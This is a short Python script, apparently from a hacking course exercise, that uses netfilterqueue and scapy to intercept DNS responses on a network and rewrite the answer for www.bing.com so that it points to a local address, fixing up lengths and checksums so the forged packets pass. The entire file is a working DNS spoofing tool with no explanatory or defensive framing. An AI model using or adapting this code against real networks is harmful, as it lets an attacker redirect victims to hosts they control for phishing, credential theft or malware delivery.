#!/usr/bin/python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packets = scapy.IP(packet.get_payload())
    if scapy_packets.haslayer(scapy.DNSRR):
        qname = (scapy_packets[scapy.DNSQR].qname)
        if "www.bing.com" in qname.decode():
            print ("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.221.139")
            scapy_packets[scapy.DNS].an = answer
            scapy_packets[scapy.DNS].ancount = 1

            del scapy_packets[scapy.IP].len
            del scapy_packets[scapy.IP].chksum
            del scapy_packets[scapy.UDP].len
            del scapy_packets[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packets))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
